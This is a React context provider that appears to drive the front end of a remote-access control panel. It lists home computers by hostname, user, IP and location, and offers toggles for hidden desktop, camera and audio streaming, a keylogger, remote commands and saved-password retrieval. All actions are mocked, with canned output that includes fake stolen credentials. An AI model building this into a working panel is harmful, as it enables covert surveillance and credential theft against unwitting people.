
import React, { createContext, useContext, useState, useEffect } from "react";
import { Computer, Category, ActiveStream, ViewMode } from "../types";
import { toast } from "@/components/ui/sonner";

// Sample data for demo purposes
const sampleCategories: Category[] = [
  { id: "1", name: "Bedroom" },
  { id: "2", name: "Office" },
  { id: "3", name: "Game Room" },
];

const sampleComputers: Computer[] = [
  {
    id: "1",
    hostname: "DESKTOP-AB123",
    username: "John",
    os: "Windows 11 Pro",
    ip: "192.168.1.101",
    categoryId: "1",
    status: "online",
    lastSeen: new Date().toISOString(),
    location: {
      latitude: 40.7128,
      longitude: -74.0060,
      address: "New York, NY, USA",
    },
  },
  {
    id: "2",
    hostname: "LAPTOP-XYZ456",
    username: "Jane",
    os: "Windows 10 Home",
    ip: "192.168.1.102",
    categoryId: "2",
    status: "online",
    lastSeen: new Date().toISOString(),
  },
  {
    id: "3",
    hostname: "GAMING-PC123",
    username: "Mike",
    os: "Windows 11 Pro",
    ip: "192.168.1.103",
    categoryId: "3",
    status: "offline",
    lastSeen: new Date(Date.now() - 3600000).toISOString(),
  },
];

interface RemoteContextType {
  computers: Computer[];
  categories: Category[];
  activeComputer: Computer | null;
  activeStream: ActiveStream;
  keyloggerActive: boolean;
  terminalHistory: { command: string; output: string }[];
  viewMode: ViewMode;
  addCategory: (name: string) => void;
  updateCategory: (id: string, name: string) => void;
  deleteCategory: (id: string) => void;
  setActiveComputer: (computer: Computer | null) => void;
  toggleDesktopStream: () => void;
  toggleCameraStream: () => void;
  toggleAudioStream: () => void;
  updateStreamQuality: (fps: number) => void;
  toggleKeylogger: () => void;
  executeCommand: (command: string) => void;
  retrievePasswords: () => void;
  uploadFile: (path: string, file: File) => Promise<void>;
  downloadFile: (path: string) => Promise<void>;
  toggleViewMode: () => void;
}

const RemoteContext = createContext<RemoteContextType | undefined>(undefined);

export const RemoteProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [computers, setComputers] = useState<Computer[]>(sampleComputers);
  const [categories, setCategories] = useState<Category[]>(sampleCategories);
  const [activeComputer, setActiveComputer] = useState<Computer | null>(null);
  const [viewMode, setViewMode] = useState<ViewMode>("grid");
  
  const [activeStream, setActiveStream] = useState<ActiveStream>({
    desktop: false,
    camera: false,
    audio: false,
    quality: {
      fps: 30,
      resolution: {
        width: 1280,
        height: 720,
      },
    },
  });
  
  const [keyloggerActive, setKeyloggerActive] = useState(false);
  const [terminalHistory, setTerminalHistory] = useState<{ command: string; output: string }[]>([]);

  const addCategory = (name: string) => {
    const newCategory = {
      id: Date.now().toString(),
      name,
    };
    setCategories([...categories, newCategory]);
    toast.success(`Category "${name}" added`);
  };

  const updateCategory = (id: string, name: string) => {
    setCategories(
      categories.map((category) =>
        category.id === id ? { ...category, name } : category
      )
    );
    toast.success(`Category updated to "${name}"`);
  };

  const deleteCategory = (id: string) => {
    const categoryName = categories.find((cat) => cat.id === id)?.name;
    setCategories(categories.filter((category) => category.id !== id));
    
    // Move computers from this category to uncategorized
    setComputers(
      computers.map((computer) =>
        computer.categoryId === id ? { ...computer, categoryId: "" } : computer
      )
    );
    
    toast.success(`Category "${categoryName}" deleted`);
  };

  const toggleDesktopStream = () => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => {
      const newState = { ...prev, desktop: !prev.desktop };
      if (newState.desktop) {
        toast.success(`Desktop stream started for ${activeComputer.hostname}`);
      } else {
        toast.info(`Desktop stream stopped for ${activeComputer.hostname}`);
      }
      return newState;
    });
  };

  const toggleCameraStream = () => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => {
      const newState = { ...prev, camera: !prev.camera };
      if (newState.camera) {
        toast.success(`Camera stream started for ${activeComputer.hostname}`);
      } else {
        toast.info(`Camera stream stopped for ${activeComputer.hostname}`);
      }
      return newState;
    });
  };

  const toggleAudioStream = () => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => {
      const newState = { ...prev, audio: !prev.audio };
      if (newState.audio) {
        toast.success(`Audio stream started for ${activeComputer.hostname}`);
      } else {
        toast.info(`Audio stream stopped for ${activeComputer.hostname}`);
      }
      return newState;
    });
  };

  const updateStreamQuality = (fps: number) => {
    if (!activeComputer) return;
    
    setActiveStream((prev) => ({
      ...prev,
      quality: {
        ...prev.quality,
        fps,
      },
    }));
    
    toast.success(`Stream quality updated to ${fps} FPS`);
  };

  const toggleKeylogger = () => {
    if (!activeComputer) return;
    
    setKeyloggerActive((prev) => {
      const newState = !prev;
      if (newState) {
        toast.success(`Keylogger started on ${activeComputer.hostname}`);
      } else {
        toast.info(`Keylogger stopped on ${activeComputer.hostname}`);
      }
      return newState;
    });
  };

  const executeCommand = (command: string) => {
    if (!activeComputer) return;
    
    // Mock command execution
    let output = "";
    
    if (command.toLowerCase().includes("dir")) {
      output = "Directory listing:\n" +
        "05/18/2024  10:30 AM    <DIR>          Documents\n" +
        "05/17/2024  03:45 PM    <DIR>          Downloads\n" +
        "05/16/2024  09:15 AM           582,432 report.docx\n" +
        "05/15/2024  11:20 AM         1,245,184 presentation.pptx";
    } else if (command.toLowerCase().includes("echo")) {
      output = command.substring(5);
    } else if (command.toLowerCase().includes("ipconfig")) {
      output = "Windows IP Configuration\n\n" +
        "Ethernet adapter Ethernet:\n" +
        "   Connection-specific DNS Suffix  . : home\n" +
        "   IPv4 Address. . . . . . . . . . . : " + activeComputer.ip + "\n" +
        "   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n" +
        "   Default Gateway . . . . . . . . . : 192.168.1.1";
    } else if (command.toLowerCase().includes("systeminfo")) {
      output = "Host Name:                 " + activeComputer.hostname + "\n" +
        "OS Name:                   " + activeComputer.os + "\n" +
        "OS Version:                10.0.19044 N/A Build 19044\n" +
        "OS Manufacturer:           Microsoft Corporation\n" +
        "System Type:               x64-based PC";
    } else {
      output = "Executing: " + command + "\nCommand executed successfully.";
    }
    
    setTerminalHistory((prev) => [...prev, { command, output }]);
  };

  const retrievePasswords = () => {
    if (!activeComputer) return;
    
    toast.success("Password retrieval initiated");
    
    // Mock password retrieval
    setTimeout(() => {
      setTerminalHistory((prev) => [
        ...prev,
        {
          command: "Retrieve Passwords",
          output: "Saved Passwords:\n" +
            "Chrome - user@gmail.com: P@ssw0rd123\n" +
            "Firefox - admin@company.com: Secure!999\n" +
            "Windows - " + activeComputer.username + ": Welcome2024",
        },
      ]);
    }, 2000);
  };

  const uploadFile = async (path: string, file: File): Promise<void> => {
    if (!activeComputer) return;
    
    // Mock file upload
    return new Promise((resolve) => {
      toast.promise(
        new Promise((res) => setTimeout(res, 2000)),
        {
          loading: `Uploading ${file.name}...`,
          success: `${file.name} uploaded to ${path}`,
          error: "Upload failed",
        }
      ).then(() => resolve());
    });
  };

  const downloadFile = async (path: string): Promise<void> => {
    if (!activeComputer) return;
    
    // Mock file download
    const filename = path.split("/").pop() || "file";
    
    return new Promise((resolve) => {
      toast.promise(
        new Promise((res) => setTimeout(res, 2000)),
        {
          loading: `Downloading ${filename}...`,
          success: `${filename} downloaded successfully`,
          error: "Download failed",
        }
      ).then(() => resolve());
    });
  };

  const toggleViewMode = () => {
    setViewMode((prev) => (prev === "grid" ? "list" : "grid"));
  };

  return (
    <RemoteContext.Provider
      value={{
        computers,
        categories,
        activeComputer,
        activeStream,
        keyloggerActive,
        terminalHistory,
        viewMode,
        addCategory,
        updateCategory,
        deleteCategory,
        setActiveComputer,
        toggleDesktopStream,
        toggleCameraStream,
        toggleAudioStream,
        updateStreamQuality,
        toggleKeylogger,
        executeCommand,
        retrievePasswords,
        uploadFile,
        downloadFile,
        toggleViewMode,
      }}
    >
      {children}
    </RemoteContext.Provider>
  );
};

export const useRemote = () => {
  const context = useContext(RemoteContext);
  if (context === undefined) {
    throw new Error("useRemote must be used within a RemoteProvider");
  }
  return context;
};
